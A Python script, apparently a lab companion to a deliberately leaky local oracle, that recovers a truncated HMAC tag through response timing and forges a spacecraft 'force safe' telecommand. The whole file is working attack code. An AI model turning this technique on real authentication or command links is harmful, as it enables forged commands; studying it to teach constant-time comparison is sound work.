"""
Timing side-channel attack — companion to tools.timing_oracle.

Recovers the 8-byte truncated HMAC tag of a forged TC byte-by-byte
by measuring the oracle's response time for each candidate.

Strategy
--------
For each byte position k = 0 .. 7:
  for each candidate b = 0 .. 255:
    Build a frame with tag[0:k] = recovered_so_far,
                       tag[k]   = b,
                       tag[k+1:] = anything (zeros).
    Send to the oracle, measure round-trip time.
  The candidate b whose median time is greatest is the correct byte.

That's because the leaky compare in the oracle stops on the first
mismatch — so the deeper into the tag the first mismatch is, the
longer the verify takes.

Total cost: 8 * 256 = 2048 oracle queries. With 1.5 ms per matched
byte in the oracle, plus TCP RTT noise, the attack finishes in
roughly 1–2 minutes.

Usage:
    # Terminal 1
    python -m tools.timing_oracle

    # Terminal 2
    python -m tools.timing_attack
"""

import argparse
import os
import socket
import statistics
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)

from protocol import space_packet as sp


# These have to match tools/timing_oracle.py.
NONCE       = bytes.fromhex("00000000000000aa")
TARGET_APID = sp.APID_FORCE_SAFE
TARGET_SEQ  = 1
TARGET_BODY = b"\x00"     # default — must match the oracle's --target-body


def open_oracle(host, port):
    s = socket.create_connection((host, port))
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.settimeout(5.0)
    return s


def query(sock, frame):
    """Send a frame, time the response, return (time_ns, accepted_bool)."""
    payload = frame.hex().encode() + b"\n"
    t0 = time.perf_counter_ns()
    sock.sendall(payload)
    reply = b""
    while not reply.endswith(b"\n"):
        chunk = sock.recv(64)
        if not chunk:
            raise IOError("oracle closed connection")
        reply += chunk
    t1 = time.perf_counter_ns()
    return t1 - t0, reply.strip() == b"ACCEPT"


def build_frame_with_tag(tag8):
    """Construct a TYPE_TC, L1 frame with TARGET body but a chosen tag.

    We reach inside the encode() pipeline rather than calling it, so we
    can override the tag bytes after they've been computed. (The
    legitimate encode() would always produce the correct tag — which
    we don't have.)
    """
    # primary header
    sh_flag = 1
    primary = sp._pack_primary(sp.TYPE_TC, sh_flag, TARGET_APID, TARGET_SEQ,
                               sp.NONCE_LEN + sp.TAG_LEN + len(TARGET_BODY))
    secondary = NONCE + tag8
    payload   = secondary + TARGET_BODY
    space_packet = primary + payload
    crc = sp.crc16_ccitt(space_packet)
    framed = space_packet + crc.to_bytes(2, "big")
    return bytes([len(framed)]) + framed


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=9009)
    ap.add_argument("--samples", type=int, default=5,
                    help="oracle queries per (position, candidate)")
    args = ap.parse_args()

    sock = open_oracle(args.host, args.port)
    print(f"connected to oracle {args.host}:{args.port}")
    print(f"samples per candidate: {args.samples}")
    print()

    # Warm-up: a few queries to amortise interpreter caches.
    warm = build_frame_with_tag(b"\x00" * sp.TAG_LEN)
    for _ in range(20):
        query(sock, warm)

    recovered = bytearray()
    for k in range(sp.TAG_LEN):
        print(f"--- byte position {k} ---")
        timings = {}
        for cand in range(256):
            samples = []
            for _ in range(args.samples):
                tag_guess = bytes(recovered) + bytes([cand]) + b"\x00" * (sp.TAG_LEN - k - 1)
                frame = build_frame_with_tag(tag_guess)
                dt, _ = query(sock, frame)
                samples.append(dt)
            # Use MIN of samples: outliers above min are scheduler
            # interference; the minimum reflects the busy-loop's
            # uninterrupted timing.
            timings[cand] = min(samples)
        best = max(timings, key=timings.get)
        sorted_cands = sorted(timings, key=timings.get, reverse=True)
        gap = (timings[sorted_cands[0]] - timings[sorted_cands[1]]) / 1000
        recovered.append(best)
        print(f"  best=0x{best:02x}  min={timings[best]/1000:.1f}µs  "
              f"gap to 2nd-best={gap:+.1f}µs")
        print(f"  recovered so far: {bytes(recovered).hex()}")

    print()
    print("=== ATTACK COMPLETE ===")
    print(f"recovered tag: {bytes(recovered).hex()}")

    # Verify
    final = build_frame_with_tag(bytes(recovered))
    _, accepted = query(sock, final)
    print(f"oracle accepts forged frame: {accepted}")
    sock.close()


if __name__ == "__main__":
    main()
